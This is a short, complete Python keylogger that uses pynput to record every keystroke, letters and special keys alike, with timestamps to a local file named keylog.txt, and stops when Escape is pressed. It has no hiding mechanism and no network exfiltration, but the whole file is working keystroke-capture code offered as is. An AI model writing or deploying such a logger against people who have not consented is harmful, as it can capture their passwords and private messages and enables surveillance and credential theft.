from pynput.keyboard import Key, Listener
import logging

# Set up logging configuration
# This will save the keystrokes to a file named "keylog.txt"
log_dir = ""

logging.basicConfig(filename=(log_dir + "keylog.txt"), 
                    level=logging.DEBUG, 
                    format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        # Log alphanumeric keysS
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        # Log special keys (Space, Enter, etc.)
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    # Stop the listener if the Escape key is pressed
    if key == Key.esc:
        return False

# Start the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()